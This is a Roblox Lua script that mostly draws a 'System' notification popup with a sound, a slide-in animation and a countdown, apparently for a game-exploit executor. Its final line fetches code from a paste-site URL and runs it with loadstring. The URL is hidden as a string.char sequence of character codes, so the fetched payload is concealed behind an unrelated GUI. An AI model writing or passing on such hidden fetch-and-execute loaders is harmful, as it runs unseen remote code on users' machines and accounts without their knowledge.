local title = "System"
local text = "New Update fly Gui has been compared to the original :D, Search my new Scripts Cmdbar2 Silent Command"
local duration = 60

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://2865227271"
sound.Volume = 1
sound.PlayOnRemove = false
sound.Parent = SoundService
sound:Play()

local ScreenGui = PlayerGui:FindFirstChild("NotificationSystem") or Instance.new("ScreenGui")
ScreenGui.Name = "NotificationSystem"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 1000
ScreenGui.Parent = PlayerGui

local Notifications = {}
for _, child in ipairs(ScreenGui:GetChildren()) do
	if child:IsA("Frame") then
		table.insert(Notifications, child)
	end
end

local offset = #Notifications * 110
local targetPos = UDim2.new(1, -20, 1, -20 - offset)

local Template = Instance.new("Frame")
Template.Name = "Notification"
Template.Parent = ScreenGui
Template.AnchorPoint = Vector2.new(1, 1)
Template.Position = UDim2.new(1, 400, 1, -20 - offset)
Template.Size = UDim2.new(0, 330, 0, 100)
Template.BackgroundTransparency = 1
Template.ClipsDescendants = true
Template.ZIndex = 10

local Bg = Instance.new("Frame")
Bg.Name = "Bg"
Bg.Parent = Template
Bg.BackgroundColor3 = Color3.fromRGB(35, 39, 47)
Bg.BackgroundTransparency = 0.05
Bg.Size = UDim2.new(1, 0, 1, 0)
Bg.ZIndex = -4
local BgCorner = Instance.new("UICorner")
BgCorner.CornerRadius = UDim.new(0, 3)
BgCorner.Parent = Bg
local BgStroke = Instance.new("UIStroke")
BgStroke.Thickness = 2
BgStroke.Color = Color3.fromRGB(80, 80, 80)
BgStroke.Transparency = 0.35
BgStroke.LineJoinMode = Enum.LineJoinMode.Round
BgStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
BgStroke.ZIndex = Bg.ZIndex + 1
BgStroke.Parent = Bg

local Topbar = Instance.new("Frame")
Topbar.Name = "Topbar"
Topbar.Parent = Template
Topbar.BackgroundColor3 = Color3.fromRGB(28, 31, 37)
Topbar.BackgroundTransparency = 0.1
Topbar.Size = UDim2.new(1, 0, 0.3, 0)
local TopbarCorner = Instance.new("UICorner")
TopbarCorner.CornerRadius = UDim.new(0, 4)
TopbarCorner.Parent = Topbar

local CloseX = Instance.new("TextButton")
CloseX.Name = "CloseX"
CloseX.Parent = Template
CloseX.AnchorPoint = Vector2.new(1, 0)
CloseX.Position = UDim2.new(1, 0, 0, 0)
CloseX.Size = UDim2.new(0.14, 0, 0.3, 0)
CloseX.BackgroundTransparency = 1
CloseX.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
CloseX.Text = "x"
CloseX.TextSize = 18
CloseX.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseX.ZIndex = 5

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Parent = Template
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, -90, 0.0700000003, 0)
Title.Size = UDim2.new(0.8, 0, 0.17, 0)
Title.FontFace = Font.new("rbxasset://fonts/families/Roboto.json", Enum.FontWeight.Light, Enum.FontStyle.Normal)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Text = title
Title.TextSize = 18
Title.ZIndex = 3

local Desc = Instance.new("TextLabel")
Desc.Name = "Desc"
Desc.Parent = Template
Desc.BackgroundTransparency = 1
Desc.Position = UDim2.new(0, 20, 0.400000006, -0)
Desc.Size = UDim2.new(0.85, 0, 0.55, 0)
Desc.FontFace = Font.new("rbxasset://fonts/families/Roboto.json", Enum.FontWeight.Light, Enum.FontStyle.Normal)
Desc.TextColor3 = Color3.fromRGB(255, 255, 255)
Desc.TextStrokeColor3 = Color3.fromRGB(10, 10, 10)
Desc.TextTransparency = 0.15
Desc.Text = text .. " (" .. duration .. ")"
Desc.TextSize = 18
Desc.TextWrapped = true
Desc.TextXAlignment = Enum.TextXAlignment.Left
Desc.TextYAlignment = Enum.TextYAlignment.Top

TweenService:Create(Template, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	Position = targetPos
}):Play()

local function slideOut()
	local allFrames = {}
	for _, child in ipairs(ScreenGui:GetChildren()) do
		if child:IsA("Frame") then
			table.insert(allFrames, child)
		end
	end
	table.sort(allFrames, function(a, b)
		return a.Position.Y.Offset > b.Position.Y.Offset
	end)
	local index
	for i, frame in ipairs(allFrames) do
		if frame == Template then
			index = i
			break
		end
	end
	if not index then return end
	local tween = TweenService:Create(Template, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
		Position = UDim2.new(1, 400, Template.Position.Y.Scale, Template.Position.Y.Offset)
	})
	tween:Play()
	tween.Completed:Wait()
	Template:Destroy()
	local i = 0
	for _, child in ipairs(ScreenGui:GetChildren()) do
		if child:IsA("Frame") then
			local newTween = TweenService:Create(child, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				Position = UDim2.new(1, -20, 1, -20 - (i * 110))
			})
			newTween:Play()
			i += 1
		end
	end
end

CloseX.MouseButton1Click:Connect(slideOut)

task.spawn(function()
	for i = duration, 0, -1 do
		Desc.Text = text .. " (" .. i .. ")"
		wait(1)
	end
	slideOut()
end)

loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,51,57,103,50,116,56,69,115,47,114,97,119)))()